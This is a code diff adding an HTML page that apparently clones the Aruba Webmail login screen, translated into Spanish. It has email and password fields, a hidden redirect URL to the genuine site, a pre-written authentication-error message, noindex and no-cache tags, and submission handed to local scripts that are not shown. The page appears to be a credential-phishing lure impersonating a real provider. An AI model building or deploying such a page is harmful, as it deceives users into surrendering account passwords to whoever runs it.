@@ -1,0 +1,1042 @@
+
+<!DOCTYPE HTML>
+<html>
+	<input type="hidden" name="lourl" value="https://webmail.aruba.it" id="lourl"> 
+<head>
+	<title>Webmail Aruba</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta CONTENT="text/html; charset=utf-8" HTTP-EQUIV="content-type" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&subset=latin,latin-ext" rel="stylesheet"
+		type="text/css">
+
+	<link rel="icon" href="https://webmail.aruba.it/web_imgs/aruba/favicon.ico" type="image/x-icon">
+
+
+	<style>
+		html {
+			height: 100%;
+			width: 100%;
+		}
+
+		body {
+			background-color: #F2F2F0;
+			color: #3f3f3f;
+			display: flex;
+			flex-direction: column;
+			font-family: "Lato", Arial;
+			font-size: 14px;
+			font-style: normal;
+			font-weight: normal;
+			height: 100%;
+			margin: 0;
+			width: 100%;
+		}
+
+		a,
+		.link {
+			color: #3C86CB;
+			cursor: pointer;
+			text-decoration: none;
+		}
+
+		a:hover,
+		.link:hover {
+			cursor: pointer;
+			text-decoration: underline;
+		}
+
+		.login-background {
+			background-color: #ffffff;
+			flex: 1 1 auto;
+			flex-direction: column;
+		}
+
+		.main-block {
+			display: flex;
+			flex: 1 1 auto;
+			justify-content: center;
+		}
+
+		.left-block {
+			display: flex;
+			flex: 0 0 auto;
+			justify-content: center;
+			overflow: hidden;
+			padding: 215px 0 0 50px;
+		}
+
+		.left-block-image,
+		.left-block iframe {
+			border: none;
+			height: 455px;
+			width: 600px
+		}
+
+		.left-block-image {
+			background: transparent url("https://webmail.aruba.it/web_imgs/login/images/left-block-image.jpg?_v_=4.2.86.1.20230523_1151") no-repeat;
+			display: none;
+		}
+
+		#language-button {
+			align-items: center;
+			display: flex;
+			flex: 0 0 auto;
+			height: 23px;
+			justify-content: flex-end;
+			margin-left: 30px;
+			background: transparent;
+			border: none;
+			padding: 0;
+		}
+
+		.language-flag {
+			background-position: center;
+			cursor: pointer;
+			flex: 0 0 auto;
+			height: 20px;
+			width: 30px;
+		}
+
+		#language-button img {
+			float: right;
+			margin-right: 2px;
+			margin-top: 8px;
+		}
+
+		#language_select {
+			cursor: pointer;
+			display: none;
+			flex: 0 0 auto;
+			padding: 0 5px;
+		}
+
+		.menu-language-arrow {
+			cursor: pointer;
+		}
+
+		#menu_language {
+			display: none;
+			z-index: 2;
+		}
+
+		#menu_language ul {
+			margin: 0;
+			padding: 0;
+			position: relative;
+			top: 22px;
+			right: 60px;
+			background-color: white;
+			border: 1px solid #ddd;
+			box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.37);
+		}
+
+		#menu_language li {
+			cursor: pointer;
+			font-size: 13px;
+			list-style: none;
+			padding: 5px 15px;
+		}
+
+		#menu_language li:hover {
+			background-color: #f1f1f1;
+		}
+
+		#menu_language button {
+			background-position: left center;
+			color: #3f3f3f;
+			display: block;
+			text-indent: 29px;
+			margin: 0;
+			border: none;
+			padding: 0;
+		}
+
+		.show {
+			display: block !important;
+			position: absolute;
+		}
+
+		#it,
+		.it .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/it.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		#en,
+		.en .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/gb.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		#hu,
+		.hu .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/hu.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		#pl,
+		.pl .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/pl.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		#es,
+		.es .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/es.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		#cz,
+		.cz .language-flag {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/flag/cz.png?_v_=4.2.86.1.20230523_1151") no-repeat scroll 5px 5px;
+		}
+
+		.right-block {
+			display: flex;
+			flex: 0 0 auto;
+			flex-direction: column;
+			padding: 65px 50px 50px;
+			width: 400px;
+		}
+
+		.logo-block {
+			align-items: center;
+			display: flex;
+			flex: 0 0 auto;
+			height: 40px;
+		}
+
+		.left-logo {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/aruba-logo.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+			flex: 1 0 auto;
+			height: 100%;
+			background-size: 140px 40px;
+		}
+
+		.right-logo {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/envelope.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+			flex: 0 0 auto;
+			height: 35px;
+			width: 45px;
+		}
+
+		.tab-switcher-block {
+			align-items: center;
+			display: flex;
+			flex: 0 0 auto;
+			justify-content: space-between;
+			margin-top: 40px;
+		}
+
+		.tab-buttons-block {
+			display: flex;
+			flex: 0 0 auto;
+		}
+
+		.tab-buttons-block> :first-child {
+			border-bottom-left-radius: 5px;
+			border-right: none;
+			border-top-left-radius: 5px;
+		}
+
+		.tab-buttons-block> :last-child {
+			border-bottom-right-radius: 5px;
+			border-top-right-radius: 5px;
+		}
+
+		.tab-button {
+			align-items: center;
+			background: #fff;
+			border: 1px solid #bbb;
+			cursor: pointer;
+			display: flex;
+			height: 35px;
+			padding: 0 20px;
+			box-sizing: border-box;
+		}
+
+		.right-block:not(.manage-tab) .tab-button.tab-1,
+		.right-block.manage-tab .tab-button.tab-2 {
+			background-color: #f1f1f1;
+			font-weight: bold;
+		}
+
+		.form-block {
+			align-items: stretch;
+			display: flex;
+			flex: 1 0 auto;
+			flex-direction: column;
+			padding-top: 24px;
+		}
+
+		.feedback-block {
+			align-items: center;
+			background-color: #fff;
+			border-radius: 6px;
+			display: flex;
+			flex: 0 0 auto;
+			font-size: 12px;
+			min-height: 31px;
+			margin-top: 35px;
+			padding: 5px 20px;
+			box-sizing: border-box;
+		}
+
+		.feedback-icon {
+			flex: 0 0 auto;
+			height: 17px;
+			margin-right: 10px;
+			width: 17px;
+		}
+
+		.feedback-block.error {
+			background-color: #fbd7ca;
+		}
+
+		.feedback-block.error .feedback-icon {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/error-icon.png?_v_=4.2.86.1.20230523_1151") no-repeat center;
+		}
+
+		.feedback-block.waiting {
+			background-color: #f1f1f1;
+		}
+
+		.feedback-block.waiting .feedback-icon {
+			background: url(https://webmail.aruba.it/web_imgs/login/images/loading.gif?_v_=4.2.86.1.20230523_1151) no-repeat center;
+		}
+
+		.feedback-text {
+			display: inline-block;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			white-space: nowrap;
+		}
+
+		.form-tab {
+			display: none;
+			flex: 1 0 auto;
+			flex-direction: column;
+		}
+
+		.right-block:not(.manage-tab) .form-tab.tab-1,
+		.right-block.manage-tab .form-tab.tab-2 {
+			display: flex;
+		}
+
+		.form-title {
+			font-size: 28px;
+			font-weight: bold;
+			margin-bottom: 25px;
+			text-align: center;
+		}
+
+		.input-container {
+			align-items: center;
+			border-bottom: 2px solid #737373;
+			display: flex;
+			margin: 5px 0;
+		}
+
+		.input-container.filled,
+		.input-container.focused {
+			border-bottom: 2px solid #f4a253;
+		}
+
+		.input-container .login-icon {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/login-icon.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+			background-size: 19px 13px;
+			flex: 0 0 auto;
+			height: 13px;
+			margin-right: 15px;
+			width: 19px;
+		}
+
+		.input-container .password-icon {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/password-icon.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+			background-size: 19px 20px;
+			flex: 0 0 auto;
+			height: 20px;
+			margin-right: 15px;
+			width: 19px;
+		}
+
+		.input-container .password-icon-2 {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/password-icon-2.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+			background-size: 22px 19px;
+			cursor: pointer;
+			flex: 0 0 auto;
+			height: 19px;
+			margin-left: 15px;
+			width: 22px;
+		}
+
+		.input-container input[type="text"]+.password-icon-2 {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/password-icon-2-visible.svg?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+		}
+
+		.input-container input[type="text"],
+		.input-container input[type="password"] {
+			background-color: #fff;
+			border: none;
+			color: #3f3f3f;
+			direction: ltr;
+			flex: 1 1 auto;
+			font-family: "Lato";
+			font-size: 16px;
+			height: 19px;
+			margin: 0;
+			outline: none;
+			padding: 14px 0;
+		}
+
+		.input-container input::placeholder {
+			color: #aaa9a9;
+		}
+
+		.input-container input:-ms-input-placeholder {
+			color: #aaa9a9;
+		}
+
+		.input-container input::-ms-input-placeholder {
+			color: #aaa9a9;
+		}
+
+		.input-container input:-webkit-autofill,
+		.input-container input:-webkit-autofill:hover,
+		.input-container input:-webkit-autofill:focus {
+			-webkit-box-shadow: 0 0 0 1000px #fff inset;
+			-webkit-text-fill-color: #3f3f3f;
+		}
+
+		.capslock-detect {
+			color: #ff0000;
+			font-weight: bold;
+			margin-bottom: 10px;
+			text-align: right;
+			visibility: hidden;
+		}
+
+		.radio-button-block {
+			display: flex;
+			align-items: center;
+		}
+
+		.radio-button-header {
+			margin-right: 10px;
+		}
+
+		.radio-button-pane {
+			display: flex;
+			justify-content: space-between;
+			flex: 1 0 auto;
+		}
+
+		.radio-button-cnt {
+			display: flex;
+			align-items: center;
+		}
+
+		.radio-button-cnt label {
+			align-items: center;
+			cursor: pointer;
+			display: flex;
+			margin: 5px 0;
+		}
+
+		.radio-button-cnt input {
+			opacity: 0;
+			position: absolute;
+		}
+
+		.radio-button-outer {
+			background-color: transparent;
+			border: 1px solid #c2c0ca;
+			border-radius: 12px;
+			height: 14px;
+			margin-right: 10px;
+			width: 14px;
+		}
+
+		.radio-button-inner {
+			border-radius: 6px;
+			height: 8px;
+			margin: 3px;
+			width: 8px;
+		}
+
+		.radio-button-cnt input[type="radio"]:checked+label .radio-button-inner {
+			background-color: #f06734;
+		}
+
+		.login-button {
+			align-items: center;
+			background: #f06734;
+			background: -webkit-linear-gradient(0deg, #d84e1a, #f06734);
+			background: -o-linear-gradient(0deg, #d84e1a, #f06734);
+			background: -moz-linear-gradient(0deg, #d84e1a, #f06734);
+			background: linear-gradient(0deg, #d84e1a, #f06734);
+			border-radius: 5px;
+			border: none;
+			color: #fff;
+			cursor: pointer;
+			display: flex;
+			font-weight: bold;
+			height: 50px;
+			justify-content: center;
+			margin: 50px 0 0;
+			padding: 0 20px;
+			text-transform: uppercase;
+			user-select: none;
+		}
+
+		.login-button:hover {
+			background: #d84e1a;
+			background: -webkit-linear-gradient(0deg, #e66536, #f27649);
+			background: -o-linear-gradient(0deg, #e66536, #f27649);
+			background: -moz-linear-gradient(0deg, #e66536, #f27649);
+			background: linear-gradient(0deg, #e66536, #f27649);
+		}
+
+		.login-button:active {
+			background: #d84e1a;
+			background: -webkit-linear-gradient(0deg, #f06734, #d84e1a);
+			background: -o-linear-gradient(0deg, #f06734, #d84e1a);
+			background: -moz-linear-gradient(0deg, #f06734, #d84e1a);
+			background: linear-gradient(0deg, #f06734, #d84e1a);
+		}
+
+		.footer-block {
+			flex: 0 0 auto;
+			font: normal normal 12px/21px "Lato";
+			height: 40px;
+			margin: 20px 0 40px;
+		}
+
+		.footer-block .accessible-link {
+			font-size: 14px;
+			margin-bottom: 3px;
+			text-align: center;
+		}
+
+		.footer-block .text-footer {
+			font-size: 11px;
+			text-align: center;
+		}
+
+		.remember-me-block {
+			display: flex;
+			margin: 20px 0 5px;
+		}
+
+		.remember-me-block label {
+			align-items: center;
+			cursor: pointer;
+			display: flex;
+			flex: 1 0 auto;
+		}
+
+		.remember-me-block input[type="checkbox"] {
+			opacity: 0;
+			position: absolute;
+		}
+
+		.remember-me-block input[type="checkbox"]+div {
+			align-items: center;
+			display: flex;
+		}
+
+		.remember-me-block input[type="checkbox"]+div:before {
+			border: 1px solid #c2c0ca;
+			border-radius: 2px;
+			content: "";
+			cursor: pointer;
+			display: block;
+			height: 13px;
+			margin: 0 10px 0 0;
+			width: 13px;
+		}
+
+		.remember-me-block input[type="checkbox"]:checked+div:before {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/check.svg?_v_=4.2.86.1.20230523_1151") no-repeat center;
+			background-size: 11px;
+		}
+
+		.remember-me-block .lost-password {
+			cursor: pointer;
+			flex: 1 0 auto;
+			text-align: right;
+		}
+
+		.test-sticker {
+			align-items: center;
+			background-color: #6abe0f;
+			color: #fff;
+			display: flex;
+			font-weight: bold;
+			margin: 0 10px;
+			padding: 2px 10px;
+			text-transform: uppercase;
+			font-size: 12px;
+		}
+
+		@media screen and (max-width: 1150px) {
+			.left-block {
+				padding-left: 5px;
+			}
+
+			.right-block {
+				padding-right: 5px;
+			}
+		}
+
+		@media screen and (max-width: 1060px) {
+			.left-block {
+				flex: 0 1 auto;
+			}
+		}
+
+		@media screen and (max-width: 1020px) {
+			.left-block {
+				display: none;
+			}
+		}
+
+		@media screen and (max-height: 895px) {
+			.left-block {
+				padding-top: 155px;
+			}
+
+			.right-block {
+				padding-top: 5px;
+			}
+		}
+
+		@media screen and (max-height: 835px) {
+			.right-block {
+				padding-bottom: 0px;
+			}
+
+			.footer-block {
+				margin: 10px 0 5px;
+			}
+		}
+
+		.cookie-directive {
+			background-color: #aaa;
+			color: #fff;
+			display: none;
+			padding: 10px 20px;
+			text-align: center;
+			position: fixed;
+			bottom: 0px;
+			width: 100%;
+		}
+
+		.pec-text {
+			flex: 1 0 auto;
+			display: flex;
+			padding-top: 10px;
+			align-items: center;
+		}
+
+		.giga-text {
+			display: none;
+			justify-content: center;
+			align-items: flex-start;
+			padding-top: 30px;
+		}
+
+		.obsolete-page {
+			background-color: #fff;
+			box-sizing: border-box;
+			color: #000;
+			height: 100%;
+			padding: 30px;
+		}
+
+		.obsolete-header {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/obsolete-logo.png?_v_=4.2.86.1.20230523_1151") no-repeat left top;
+			background-size: 208px 40px;
+			border-bottom: 1px solid #ddd;
+			height: 66px;
+		}
+
+		.obsolete-content {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/obsolete-browser.png?_v_=4.2.86.1.20230523_1151") no-repeat left top;
+			background-size: 158px 112px;
+			margin: 150px auto;
+			padding-left: 238px;
+			width: 500px;
+		}
+
+		.obsolete-browser-title {
+			font-size: 24px;
+		}
+
+		.obsolete-browser-subtitle {
+			margin-top: 15px;
+		}
+
+		.obsolete-browser-item {
+			background-size: 23px;
+			margin-top: 25px;
+			padding-left: 35px;
+		}
+
+		.obsolete-browser-item.chrome {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/chrome.png?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+		}
+
+		.obsolete-browser-item.opera {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/opera.png?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+		}
+
+		.obsolete-browser-item.firefox {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/firefox.png?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+		}
+
+		.obsolete-browser-item.safari {
+			background: url("https://webmail.aruba.it/web_imgs/login/images/safari.png?_v_=4.2.86.1.20230523_1151") no-repeat left center;
+		}
+
+		.obsolete-browser-item-title {
+			font-weight: bold;
+		}
+
+		.obsolete-browser-item-subtitle {
+			color: #999;
+		}
+
+		.radio-button-cnt input[type="radio"]:focus+label,
+		.remember-me-block input[type="checkbox"]:focus+div {
+			outline: auto;
+		}
+
+		.radio-button-cnt input[type="radio"]:focus+label,
+		.remember-me-block input[type="checkbox"]:focus+div {
+			outline: auto;
+		}
+
+		.pec-dialog-overlay {
+			position: absolute;
+			top: 0;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			z-index: 100;
+			background: #000;
+			opacity: 0.6;
+			display: none;
+		}
+
+		.pec-dialog-block {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			background: #fff;
+			border: 1px solid #989898;
+			border-radius: 3px;
+			width: 488px;
+			min-height: 275px;
+			z-index: 101;
+			opacity: 1;
+			display: none;
+			flex-direction: column;
+			color: #3F3F3F;
+		}
+
+		.pec-dialog-title {
+			background: #F1F1F1;
+			padding: 24px;
+			display: flex;
+			align-items: center;
+		}
+
+		.pec-dialog-title-button {
+			flex: 0 0 auto;
+			height: 12px;
+			width: 12px;
+			cursor: pointer;
+			margin-left: 15px;
+			background: url(https://webmail.aruba.it/layout/origin/themes/basic/images/global/tab_close.png?_v_=4.2.86.1.20230523_1151) no-repeat right top;
+		}
+
+		.pec-dialog-title-text {
+			flex: 1 1 auto;
+			font: normal normal normal 20px/24px Lato;
+		}
+
+		.pec-dialog-body {
+			padding: 24px;
+			display: flex;
+			flex-direction: column;
+			flex: 1 1 auto;
+			font: normal normal normal 14px/21px Arial;
+		}
+
+		.pec-dialog-body-text {
+			flex: 1 1 auto;
+		}
+
+		.pec-dialog-button-bar {
+			flex: 0 0 auto;
+			display: flex;
+			justify-content: flex-end;
+			padding: 20px 0 10px;
+		}
+
+		.pec-dialog-button-ok,
+		.pec-dialog-button-cancel {
+			flex: 0 0 auto;
+			border-radius: 5px;
+			font-size: 14px;
+			padding: 9px 16px;
+			cursor: pointer;
+			min-width: 100px;
+			box-sizing: border-box;
+			text-align: center;
+		}
+
+		.pec-dialog-button-ok {
+			margin-right: 16px;
+			background: #D94F1B;
+			color: #fff;
+			border: 1px solid #D94F1B;
+		}
+
+		.pec-dialog-button-cancel {
+			background: #F3F3F3;
+			border: 1px solid #3F3F3F;
+		}
+
+		.feedback-cnt {
+			width: 46px;
+			height: 159px;
+			position: fixed;
+			z-index: 999;
+			left: 0;
+			top: 65%;
+			margin-top: -79.5px;
+			box-shadow: rgba(60, 64, 67, 0.3) 0px 1px 2px 0px, rgba(60, 64, 67, 0.15) 0px 1px 3px 1px;
+			border-radius: 0 5px 5px 0;
+			cursor: pointer;
+		}
+
+		.feedback-cnt span {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: rotate(270deg) translate(-50%, -50%);
+			transform-origin: 0 0;
+			font-size: 18px;
+			font-weight: bold;
+		}
+
+		.usabilla_live_button_container {
+			display: none;
+		}
+	</style>
+	<meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Cache-Control" content="no-cache">
+<meta http-equiv="Cache-Control" content="private">
+<meta http-equiv="Pragma" content="no-cache">
+</head>
+
+<body>
+	<div class="obsolete-page" style="display: none">
+		<div class="obsolete-header"></div>
+		<div class="obsolete-content">
+			<div class="obsolete-browser-title" data-i18n="obsolete_browser_title"></div>
+			<div class="obsolete-browser-subtitle" data-i18n="obsolete_browser_subtitle"></div>
+			<div class="obsolete-browser-list">
+				<div class="obsolete-browser-item chrome">
+					<div class="obsolete-browser-item-title" data-i18n="obsolete_browser_chrome_title"></div>
+					<div class="obsolete-browser-item-subtitle" data-i18n="obsolete_browser_chrome_subtitle"></div>
+				</div>
+				<div class="obsolete-browser-item firefox">
+					<div class="obsolete-browser-item-title" data-i18n="obsolete_browser_firefox_title"></div>
+					<div class="obsolete-browser-item-subtitle" data-i18n="obsolete_browser_firefox_subtitle"></div>
+				</div>
+				<div class="obsolete-browser-item safari">
+					<div class="obsolete-browser-item-title" data-i18n="obsolete_browser_safari_title"></div>
+					<div class="obsolete-browser-item-subtitle" data-i18n="obsolete_browser_safari_subtitle"></div>
+				</div>
+				<div class="obsolete-browser-item opera">
+					<div class="obsolete-browser-item-title" data-i18n="obsolete_browser_opera_title"></div>
+					<div class="obsolete-browser-item-subtitle" data-i18n="obsolete_browser_opera_subtitle"></div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="login-background">
+		<div class="main-block">
+			<div class="left-block">
+				<img src="https://secure-ds.serving-sys.com/resources/PROD/asset/1073743419/IMAGE/20230613/600x455_SpazioMailIllimitato_0623_80030018383684431.jpg" alt="">
+				<div class="left-block-image" style="display: none"></div>
+			</div>
+			<div class="right-block">
+				<div class="logo-block">
+					<div class="left-logo"></div>
+					<div class="right-logo"></div>
+				</div>
+				<div class="tab-switcher-block">
+					<div class="tab-buttons-block">
+						<button type="button" class="tab-button tab-1 hide-in-classic" data-i18n="title_tab_1"
+							onClick="displayTab('1')">Webmail</button>
+						<button type="button" class="tab-button tab-2 hide-in-classic" data-i18n="title_tab_2"
+							onClick="displayTab('2')">Gestionar las cuentax del dominio</button>
+					</div>
+					
+				</div>
+				<div class="feedback-block">
+					<div id="msg" style="display: none; background-color: #fbd7ca; padding: 20px;">
+						Se ha producido un error durante la autenticación. Vuelve a intentarlo.
+						Para acceder a tu cuenta PEC.
+						
+					</div>
+					<div class="feedback-text" id="feedback-text"></div>
+				</div>
+				<div class="form-block">
+					<div class="form-tab tab-1" id="tab1">
+						<div data-i18n="form_title" class="form-title">Accede a tu Webmail</div>
+						
+						<div class="input-container">
+							<div class="login-icon"></div>
+							<input type="text" id="email" name="email" value="" placeholder="Correo electrónico">
+						</div>
+						<div class="input-container">
+							<div class="password-icon"></div>
+							<input type="password" id="password" name="password" value=""
+								placeholder="Contraseña">
+						</div>
+						<div class="remember-me-block">
+							<label for="remember_me">
+								<input type="checkbox" id="remember_me" name="remember_me" /> 
+								<div class="hide-in-classic" data-i18n="remember_me_label">Recordarme<br/></div>
+							</label>
+							<div data-i18n="reset_password" class="lost-password"><a href="#self">¿Has olvidado tu contraseña?</a></div>
+						</div>
+						
+						<div class="radio-button-block hide-in-classic"><br/>SELECCIONAR VERSIÓN:
+							<div class="radio-button-header" data-i18n="select_version"></div>
+							<div class="radio-button-pane">
+								<div class="radio-button-cnt">
+									<input type="radio" name="webmail_version" id="new_webmail_version" value="0">
+									<label for="new_webmail_version">
+										<div class="radio-button-outer">
+											<div class="radio-button-inner"></div>
+										</div>
+										<div class="radio-button-label" data-i18n="radio_smart">Smart</div>
+									</label>
+									<div class="test-sticker">
+										<div data-i18n="sticker_test">Nueva</div>
+									</div>
+								</div>
+								<div class="radio-button-cnt">
+									<input type="radio" name="webmail_version" id="web2cs_version" value="1">
+									<label for="web2cs_version">
+										<div class="radio-button-outer">
+											<div class="radio-button-inner"></div>
+										</div>
+										<div class="radio-button-label" data-i18n="radio_complete">Classic</div>
+									</label>
+								</div>
+							</div>
+						</div>
+						<button type="button" data-i18n="button_login" id="submit-btn" class="login-button"
+							>iniciar sesión</button>
+						<div class="giga-text">
+							<div data-i18n="giga_text"></div>
+						</div>
+					</div>
+					<div class="form-tab tab-2" id="tab2">
+						<div data-i18n="form_title_admin" class="form-title"></div>
+						<div class="input-container">
+							<div class="login-icon"></div>
+							<div class="postmaster-div">postmaster@</div>
+							<input type="text" id="login_domain" name="domain" value="" data-i18n-placeholder="domain">
+						</div>
+						<div class="input-container">
+							<div class="password-icon"></div>
+							<input type="password" id="password_domain" name="PASSWD" value=""
+								onkeypress="capLock(event,'capslock_detect_pm');"
+								data-i18n-placeholder="password_postmaster">
+							<div class="password-icon-2" onClick="showPassword('password_domain')"></div>
+						</div>
+						<div class="remember-me-block">
+							<div data-i18n="lost_password_postmaster" class="lost-password"></div>
+						</div>
+						<div class="capslock-detect" id="capslock_detect_pm">Caps Lock</div>
+						<div class="radio-button-block hide-in-classic">
+							<div class="radio-button-header" data-i18n="select_version"></div>
+							<div class="radio-button-pane">
+								<div id="postmaster_smart" class="radio-button-cnt">
+									<input type="radio" name="postmaster_version" id="new_postmaster_version" value="0"
+										checked="checked">
+									<label for="new_postmaster_version">
+										<div class="radio-button-outer">
+											<div class="radio-button-inner"></div>
+										</div>
+										<div class="radio-button-label" data-i18n="postmaster_radio_smart"></div>
+									</label>
+									<div class="test-sticker">
+										<div data-i18n="sticker_test_manage"></div>
+									</div>
+								</div>
+								<div id="postmaster_completa" class="radio-button-cnt">
+									<input type="radio" name="postmaster_version" id="postmaster_version" value="1">
+									<label for="postmaster_version">
+										<div class="radio-button-outer">
+											<div class="radio-button-inner"></div>
+										</div>
+										<div class="radio-button-label" data-i18n="postmaster_radio_complete"></div>
+									</label>
+								</div>
+							</div>
+						</div>
+						<button type="button" data-i18n="button_login_postmaster" class="login-button"
+							onClick="launchAdmin()"></button>
+						<div class="pec-text">
+							<div data-i18n="pec_text"></div>
+						</div>
+						<div class="giga-text">
+							<div data-i18n="giga_text"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="footer-block">
+			<div class="accessible-link" data-i18n="accessible_link"></div>
+			<div class="text-footer" data-i18n="copyright"></div>
+			<div class="text-footer" data-i18n="cookie_bot"></div>
+		</div>
+		<div class="pec-dialog-overlay"></div>
+		<div class="pec-dialog-block">
+			<div class="pec-dialog-title">
+				<div class="pec-dialog-title-text" data-i18n="pec_dialog_title"></div>
+				<div class="pec-dialog-title-button" onClick="pecHideDialog()"></div>
+			</div>
+			<div class="pec-dialog-body">
+				<div class="pec-dialog-body-text" data-i18n="pec_dialog_text"></div>
+				<div class="pec-dialog-button-bar">
+					<div class="pec-dialog-button-ok" data-i18n="pec_dialog_button_login" onClick="pecRedirect()"></div>
+					<div class="pec-dialog-button-cancel" data-i18n="pec_dialog_button_cancel"
+						onClick="pecHideDialog()"></div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<form id="redirect" name="redirect" method="POST" target="_top">
+		<input type="hidden" name="xam" value="0">
+	</form>
+	<div id="feedback" class="feedback-cnt"><span data-i18n="feedback_text"></span></div>
+	
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="/scripts/login-handler.js"></script>
+<script src="/../scripts/prefill-email.js"></script>
+</html>
